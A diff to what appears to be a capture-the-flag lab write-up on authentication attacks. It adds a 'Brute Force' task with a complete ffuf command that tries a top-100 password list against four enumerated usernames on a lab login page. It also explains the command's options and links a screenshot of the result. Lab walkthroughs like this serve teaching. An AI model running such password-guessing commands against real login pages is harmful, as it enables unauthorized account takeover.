@@ -38,4 +38,15 @@ so we can verify that there's 4 username (admin, robert, simon and steve)
 
 ---------------------------------------------------------------------------------------------------------------------
 
-### Task 2 Username Enumeration
+### Task 3 Brute Force
+
+http://10.10.157.211/customers/login
+
+> ffuf -w /root/valid_usernames.txt:W1,/root/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.157.211/customers/login -fc 200
+
+W1 for our list of valid usernames (admin, steve, simon, robert)
+W2 for the list of passwords we will try
+-fc argument to check for an HTTP status code other than 200
+
+![image](https://user-images.githubusercontent.com/44063862/159868593-937006ff-2218-46cb-ac65-6b710676abd3.png)
+
